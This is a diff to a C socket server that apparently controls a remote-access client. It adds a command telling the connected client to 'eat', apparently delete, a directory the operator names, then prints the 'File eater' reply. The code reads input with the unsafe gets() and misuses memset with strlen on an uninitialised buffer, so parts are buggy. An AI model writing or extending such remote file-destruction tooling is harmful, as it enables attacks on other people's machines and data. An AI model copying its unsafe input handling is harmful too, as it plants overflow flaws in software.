@@ -10,7 +10,7 @@ WSADATA wsa;
 SOCKET s, new_socket;
 struct sockaddr_in server, client;
 int c, recv_size;
-char buffer[2048];
+char buffer[2048], dirName[2048];;
 
 
 // Repetitive code declared as functions here...
@@ -150,7 +150,7 @@ int main(int argc , char *argv[])
 {
 
 	// Main Code
-	// showAnimation();
+	showAnimation();
 	
 	system("cls");
 	fprintf(stderr, "=====================================================\n");
@@ -230,7 +230,7 @@ int main(int argc , char *argv[])
 				fprintf(stderr, "\n[+] Requesting client to go to specific directory...");
 
 				// Sending folder name to client
-				char dirName[2048];
+				
 
 				memset(buffer,0,strlen(dirName));
 				
@@ -263,14 +263,46 @@ int main(int argc , char *argv[])
 
 				break;
 
+			case 5:
+				// Asking client to eat a folder
+				writeToBuffer(" 5");
+				reliableSend();
+
+				fprintf(stderr, "\n[+] Requesting client to eat a specific directory...");
+
+				// Sending folder name to client
+				
+
+				memset(buffer,0,strlen(dirName));
+				
+				fprintf(stderr, "\nEnter name of the directory you want to eat: ");
+				fflush(stdin);
+				gets(dirName);
+
+				writeToBuffer(dirName);
+				reliableSend();
+
+				// Recieving data
+				reliableRecieve();
+				fprintf(stderr, "\n[+] File eater says:");
+				fprintf(stderr, "\n%s", buffer);
+
+				break;
+
 			default:
 				fprintf(stderr, "Incorrect Option Chosen.");
 				break;
+			
+
+
 		}
 
-		fflush(stdin);
-		printf("\n\nPress any key to continue...");
-		getchar();
+		if (choice != 0){
+			fflush(stdin);
+			printf("\n\nPress any key to continue...");
+			getchar();
+			system("cls");
+		}
 	}
 	// Not closing properly on purpose
 	// closesocket(s);
